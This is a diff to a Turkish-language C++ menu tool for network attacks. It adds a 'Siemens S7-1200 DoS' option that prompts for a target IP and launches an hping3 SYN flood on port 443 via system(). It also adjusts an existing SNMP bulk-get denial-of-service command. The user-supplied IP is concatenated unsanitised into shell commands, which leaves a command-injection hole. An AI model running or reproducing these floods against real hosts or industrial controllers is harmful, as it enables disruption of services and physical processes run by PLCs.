@@ -10,7 +10,7 @@ void cikisKontrol(int);
 void enumIslem();
 void smbIslem();
 void snmpIslem();
-
+void dosIslem();
 
 int main(){
 	
@@ -25,6 +25,7 @@ void program(){
 	cout<<"Opsiyon 2 : SMB Paylaşımları"<< endl;
 	cout<<"Opsiyon 3 : SMB üzerinden İşletim Sistemi Kontrolleri"<< endl;
 	cout<<"Opsiyon 4 : SNMP Bulk DOS Saldırısı"<< endl;
+	cout<<"Opsiyon 5 : Siemens S7-1200 DoS Saldırısı"<< endl;
 	cout<<"Seçiminizi girin (1-4):  ";
 	int secim;
 	cin>>secim;
@@ -70,6 +71,10 @@ void islem (int a){
 			//SNMP Bulk DOS Saldırısı
 			snmpIslem();
 			break;
+		case 5:
+			//Siemens S7-1200 DoS Saldırısı
+			dosIslem();
+			break;
 		default:
 			cout<<"Hatalı Giriş Yaptınız! - ";
 			program();
@@ -108,10 +113,23 @@ void snmpIslem(){
 	string snmpHedefIP;
 	cout<<"Hedef IP'yi girin:  ";
 	cin>>snmpHedefIP;
-	string komutSnmp_S = "snmpbulkget -v2c -0s -c public" + snmpHedefIP;
+	string komutSnmp_S = "snmpbulkget -v2c -0s -c public " + snmpHedefIP + " 100";
 	int snmpSayi = komutSnmp_S.length();
 	char komutSnmp_C[snmpSayi + 1];
 	strcpy(komutSnmp_C, komutSnmp_S.c_str());
 	system(komutSnmp_C);
+	
+}
+
+void dosIslem(){
+	
+	string dosHedefIP;
+	cout<<"Hedef IP'yi girin:  ";
+	cin>>dosHedefIP;
+	string komutDos_S = "hping3 --flood -S -p 443 " + dosHedefIP;
+	int dosSayi = komutDos_S.length();
+	char komutDos_C[dosSayi + 1];
+	strcpy(komutDos_C, komutDos_S.c_str());
+	system(komutDos_C);
 	
 }
